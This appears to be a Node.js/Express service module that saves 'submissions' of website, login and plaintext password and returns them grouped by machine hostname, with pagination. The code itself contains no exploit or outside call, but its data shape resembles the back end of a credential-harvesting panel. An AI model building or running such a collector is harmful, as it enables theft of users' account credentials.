const Submission = require('../models/Submission');
const { validationResult } = require('express-validator');

// Create a new submission
const createSubmission = async (data) => {
  try {
    const submission = new Submission(data);
    return await submission.save();
  } catch (error) {
    throw new Error(`Failed to save submission: ${error.message}`);
  }
};

// Get submissions grouped by hostname
const getSubmissionsByHostname = async () => {
  try {
    // Group by hostname and sort by timestamp
    const submissions = await Submission.aggregate([
      {
        $sort: { hostname: 1, timestamp: -1 }
      },
      {
        $group: {
          _id: "$hostname",
          submissions: {
            $push: {
              website: "$website",
              login: "$login",
              password: "$password",
              timestamp: "$timestamp"
            }
          }
        }
      },
      {
        $project: {
          hostname: "$_id",
          submissions: 1,
          _id: 0
        }
      }
    ]);
    
    return submissions;
  } catch (error) {
    throw new Error(`Failed to fetch submissions: ${error.message}`);
  }
};

// Get all submissions with pagination
const getAllSubmissions = async (page = 1, limit = 10) => {
  try {
    const skip = (page - 1) * limit;
    
    const submissions = await Submission.find()
      .sort({ timestamp: -1 })
      .skip(skip)
      .limit(limit);
      
    const total = await Submission.countDocuments();
    
    return {
      submissions,
      pagination: {
        page,
        limit,
        total,
        pages: Math.ceil(total / limit)
      }
    };
  } catch (error) {
    throw new Error(`Failed to fetch all submissions: ${error.message}`);
  }
};

module.exports = {
  createSubmission,
  getSubmissionsByHostname,
  getAllSubmissions
};